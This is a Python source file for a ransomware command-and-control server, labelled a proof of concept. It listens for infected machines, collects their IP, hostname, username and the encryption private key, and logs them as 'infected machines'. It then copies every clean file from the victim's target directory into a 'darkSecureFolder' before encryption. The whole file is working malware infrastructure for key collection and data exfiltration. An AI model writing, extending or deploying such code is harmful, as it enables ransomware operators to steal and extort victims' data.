#!/usr/bin/env python3
"""
C2 Server for Ransomware PoC (Alternative Version)
This server uses port 8080 to avoid requiring administrator privileges
"""

import socket
import threading
import json
import os
import shutil
import time
from datetime import datetime
import logging

# -----------------
# LOGGING SETUP
# -----------------
def setup_logging():
    """Setup logging for C2 server activities"""
    if not os.path.exists('logs'):
        os.makedirs('logs')
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_filename = f'logs/c2_server_alt_{timestamp}.log'
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_filename, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )
    
    logger = logging.getLogger(__name__)
    logger.info("=" * 60)
    logger.info("C2 SERVER (ALT) STARTED")
    logger.info("=" * 60)
    logger.info(f"Log file: {log_filename}")
    logger.info(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    return logger

# -----------------
# CONFIGURATION
# -----------------
HOST = '127.0.0.1'  # Localhost for testing
PORT = 8080         # Non-privileged port
BUFFER_SIZE = 4096
DARK_SECURE_FOLDER = "darkSecureFolder"  # Folder to store exfiltrated files

# -----------------
# DATA STORAGE
# -----------------
infected_machines = {}  # Store data from infected machines
server_running = True   # Flag to control server shutdown

def copy_target_directory_files(target_path, machine_id, logger):
    """Copy all files from target directory to darkSecureFolder"""
    try:
        # Create darkSecureFolder if it doesn't exist
        if not os.path.exists(DARK_SECURE_FOLDER):
            os.makedirs(DARK_SECURE_FOLDER)
            logger.info(f"Created {DARK_SECURE_FOLDER} directory")
        
        # Create machine-specific subfolder
        machine_folder = os.path.join(DARK_SECURE_FOLDER, machine_id)
        if not os.path.exists(machine_folder):
            os.makedirs(machine_folder)
            logger.info(f"Created machine folder: {machine_folder}")
        
        # Check if target path exists
        if not os.path.exists(target_path):
            logger.warning(f"Target path does not exist: {target_path}")
            return False
        
        files_copied = 0
        total_size = 0
        
        logger.info(f"Starting file exfiltration from: {target_path}")
        logger.info("IMPORTANT: Copying CLEAN files BEFORE encryption!")
        
        # Walk through the target directory
        for root, dirs, files in os.walk(target_path):
            # Create corresponding directory structure in darkSecureFolder
            relative_path = os.path.relpath(root, target_path)
            if relative_path == '.':
                dest_dir = machine_folder
            else:
                dest_dir = os.path.join(machine_folder, relative_path)
                if not os.path.exists(dest_dir):
                    os.makedirs(dest_dir)
            
            # Copy each file
            for file in files:
                src_file = os.path.join(root, file)
                dest_file = os.path.join(dest_dir, file)
                
                # Skip files that are already encrypted (.wasted extension)
                if file.endswith('.wasted'):
                    logger.warning(f"Skipping already encrypted file: {src_file}")
                    continue
                
                try:
                    # Copy file
                    shutil.copy2(src_file, dest_file)
                    file_size = os.path.getsize(src_file)
                    total_size += file_size
                    files_copied += 1
                    
                    logger.info(f"Copied CLEAN file: {src_file} -> {dest_file} ({file_size} bytes)")
                    
                except Exception as e:
                    logger.error(f"Failed to copy {src_file}: {str(e)}")
        
        logger.info("=" * 50)
        logger.info("FILE EXFILTRATION COMPLETED")
        logger.info("=" * 50)
        logger.info(f"Total files copied: {files_copied}")
        logger.info(f"Total size: {total_size} bytes ({total_size / 1024 / 1024:.2f} MB)")
        logger.info(f"Destination: {machine_folder}")
        logger.info("NOTE: All copied files are CLEAN (not encrypted)")
        logger.info("=" * 50)
        
        return True
        
    except Exception as e:
        logger.error(f"Error during file exfiltration: {str(e)}")
        return False

def handle_client(client_socket, client_address, logger):
    """Handle individual client connections"""
    try:
        logger.info(f"New connection from {client_address}")
        
        # Receive data from client
        data = client_socket.recv(BUFFER_SIZE).decode('utf-8')
        if not data:
            logger.warning(f"No data received from {client_address}")
            return
        
        logger.info(f"Received data from {client_address}: {len(data)} bytes")
        
        # Parse the received data
        # Format: IP$OS$PRIVATE_KEY$PUBLIC_KEY$USERNAME$HOSTNAME$TARGET_DIR
        parts = data.split('$')
        if len(parts) >= 7:
            machine_data = {
                'ip_address': parts[0],
                'operating_system': parts[1],
                'private_key': parts[2],
                'public_key': parts[3],
                'username': parts[4],
                'hostname': parts[5],
                'target_directory': parts[6],
                'timestamp': datetime.now().isoformat(),
                'client_address': f"{client_address[0]}:{client_address[1]}"
            }
            
            # Store the data
            machine_id = f"{parts[0]}_{parts[5]}_{parts[4]}"  # IP_HOSTNAME_USERNAME
            infected_machines[machine_id] = machine_data
            
            # Log the received information
            logger.info("=" * 40)
            logger.info(f"INFECTED MACHINE DATA RECEIVED")
            logger.info("=" * 40)
            logger.info(f"Machine ID: {machine_id}")
            logger.info(f"IP Address: {machine_data['ip_address']}")
            logger.info(f"Operating System: {machine_data['operating_system']}")
            logger.info(f"Username: {machine_data['username']}")
            logger.info(f"Hostname: {machine_data['hostname']}")
            logger.info(f"Target Directory: {machine_data['target_directory']}")
            logger.info(f"Timestamp: {machine_data['timestamp']}")
            logger.info(f"Private Key Length: {len(machine_data['private_key'])} chars")
            logger.info(f"Public Key Length: {len(machine_data['public_key'])} chars")
            logger.info("=" * 40)
            
            # Save detailed data to file
            save_machine_data(machine_id, machine_data, logger)
            
            # Start file exfiltration using the target directory from ransomware
            target_path = machine_data['target_directory']
            
            # Check if this is a pre-encryption connection (no GUI launch)
            # We'll determine this by checking if the connection closes immediately
            logger.info(f"Starting file exfiltration for path: {target_path}")
            logger.info("Copying clean files BEFORE encryption...")
            
            exfiltration_thread = threading.Thread(
                target=copy_target_directory_files,
                args=(target_path, machine_id, logger),
                daemon=True
            )
            exfiltration_thread.start()
            logger.info(f"Started file exfiltration thread for path: {target_path}")
            
            # Wait a moment for the connection to potentially close (indicating pre-encryption)
            time.sleep(0.5)
            
            # Try to receive more data (if connection is still open, it's post-encryption)
            try:
                client_socket.settimeout(1)
                additional_data = client_socket.recv(1024)
                if additional_data:
                    logger.info("Post-encryption connection detected - launching GUI")
                    # This would be where we handle the GUI launch
                    # For now, we just log it
                else:
                    logger.info("Pre-encryption connection - files copied, waiting for encryption to complete")
            except:
                logger.info("Pre-encryption connection - files copied, waiting for encryption to complete")
            
        else:
            logger.warning(f"Invalid data format from {client_address}: {data}")
            
    except Exception as e:
        logger.error(f"Error handling client {client_address}: {str(e)}")
    finally:
        client_socket.close()
        logger.info(f"Connection closed with {client_address}")

def save_machine_data(machine_id, data, logger):
    """Save machine data to a JSON file"""
    try:
        if not os.path.exists('c2_data'):
            os.makedirs('c2_data')
        
        filename = f'c2_data/{machine_id}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        logger.info(f"Machine data saved to: {filename}")
        
    except Exception as e:
        logger.error(f"Error saving machine data: {str(e)}")

def print_status(logger):
    """Print current status of infected machines"""
    logger.info("=" * 60)
    logger.info("C2 SERVER STATUS")
    logger.info("=" * 60)
    logger.info(f"Total infected machines: {len(infected_machines)}")
    logger.info(f"Dark secure folder: {DARK_SECURE_FOLDER}")
    
    if infected_machines:
        logger.info("Infected machines:")
        for machine_id, data in infected_machines.items():
            logger.info(f"  - {machine_id}")
            logger.info(f"    IP: {data['ip_address']}")
            logger.info(f"    OS: {data['operating_system']}")
            logger.info(f"    User: {data['username']}")
            logger.info(f"    Time: {data['timestamp']}")
    else:
        logger.info("No infected machines yet")
    
    logger.info("=" * 60)

def start_server():
    """Start the C2 server"""
    global server_running
    server_running = True
    logger = setup_logging()
    
    # Create server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        
        logger.info(f"C2 Server listening on {HOST}:{PORT}")
        logger.info(f"Dark secure folder: {DARK_SECURE_FOLDER}")
        logger.info("Waiting for ransomware connections...")
        logger.info("Press Ctrl+C to stop the server")
        
        # Start status thread
        status_thread = threading.Thread(target=lambda: print_status(logger), daemon=True)
        status_thread.start()
        
        while server_running:
            try:
                # Set a timeout so we can check server_running flag
                server_socket.settimeout(1.0)
                client_socket, client_address = server_socket.accept()
                
                # Handle each client in a separate thread
                client_thread = threading.Thread(
                    target=handle_client,
                    args=(client_socket, client_address, logger),
                    daemon=True
                )
                client_thread.start()
                
            except socket.timeout:
                # Timeout occurred, check if we should continue
                continue
            except KeyboardInterrupt:
                logger.info("Server shutdown requested")
                server_running = False
                break
            except Exception as e:
                logger.error(f"Error accepting connection: {str(e)}")
                
    except Exception as e:
        logger.error(f"Error starting server: {str(e)}")
    finally:
        server_running = False
        server_socket.close()
        logger.info("C2 Server stopped")
        logger.info("All connections closed")
        logger.info("=" * 60)
        logger.info("C2 SERVER SHUTDOWN COMPLETE")
        logger.info("=" * 60)

if __name__ == "__main__":
    print("C2 Server for Ransomware PoC (Alternative)")
    print("=" * 40)
    print(f"Host: {HOST}")
    print(f"Port: {PORT}")
    print(f"Dark Secure Folder: {DARK_SECURE_FOLDER}")
    print("=" * 40)
    print("This version uses port 8080 (no admin privileges needed)")
    print("=" * 40)
    
    start_server() 